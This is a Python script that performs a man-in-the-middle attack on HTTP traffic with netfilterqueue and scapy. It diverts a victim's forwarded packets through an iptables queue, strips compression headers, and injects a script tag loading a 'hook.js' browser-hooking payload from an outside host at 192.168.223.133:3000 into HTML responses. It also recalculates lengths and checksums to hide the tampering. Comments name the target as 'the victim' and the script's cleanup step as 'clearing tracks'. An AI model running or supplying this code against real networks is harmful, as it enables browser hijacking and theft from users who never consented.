# usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import subprocess
import re

# Set the payload of the packet and recalculate chksum and len fields in the TCP and IP layer:
def setLoad(pckt, load):
    # When the victim try to download a ".exe" file he\she is redirected to this other ".exe" link:
    pckt[scapy.Raw].load = load
    # The value of the following fields are changed because the file is changed, they will be removed and
    # scapy automatically recalculate the values of these fields inserting the correct values:
    del pckt[scapy.TCP].chksum
    del pckt[scapy.IP].chksum
    del pckt[scapy.IP].len
    return pckt

# netfilterqueue callback function that process the packets
def processPacket(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    # Data sent in HTTP layer are placed in the Raw layer of the scapy packet:
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load

        # This a REQUEST: a packet is leaving our computer:
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            print(scapy_packet.show())
            # Remove the Accept-Encoding to avoid to accept gzip encoding format and obtain the load in HTML format:
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")

        # This is a RESPONSE: a packet is entering in out computer:
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            # print(scapy_packet.show())

            # Add the JavaScript script at the end of my response payload:
            #injection_code = "<script>alert('test');</script>"
            injection_code = '<script src="http://192.168.223.133:3000/hook.js"></script>'

            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)

            # If the packet contains "Content-Lenght" header, recalculate it and set it using the updated value.
            # N.B: I have to ensure that this is only done for HTML page, I have not to replace the content lenght
            # of other responses containing for example images, text in order to avoid "Bad Request" error:
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        # If the payload of a packet was changed by the script, update it:
        if load != scapy_packet[scapy.Raw].load:
            # Forging the new request\response forged packet.
            # REQUEST: Set the payload of the original packet with the new forged request packet accepting only
            #          HTML code as response:
            # RESPONSE: Set the new response packet containing the JavaScript script:
            new_packet = setLoad(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


queueNum = 1
# Set the netfilterqueue for local machine:
#subprocess.call(["iptables", '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', str(queueNum)])
#subprocess.call(["iptables", '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', str(queueNum)])
# Set the netfilterqueue for remote vicitm machine:
subprocess.call(["iptables", '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num',  str(queueNum)])
# Start apache2 service:
subprocess.call(["service", 'apache2', 'start'])

queue = netfilterqueue.NetfilterQueue()
queue.bind(queueNum, processPacket)
try:
    queue.run()
except:
    print("Clearing tracks...")
    subprocess.call(['iptables', '--flush'])
    subprocess.call(["service", 'apache2', 'stop'])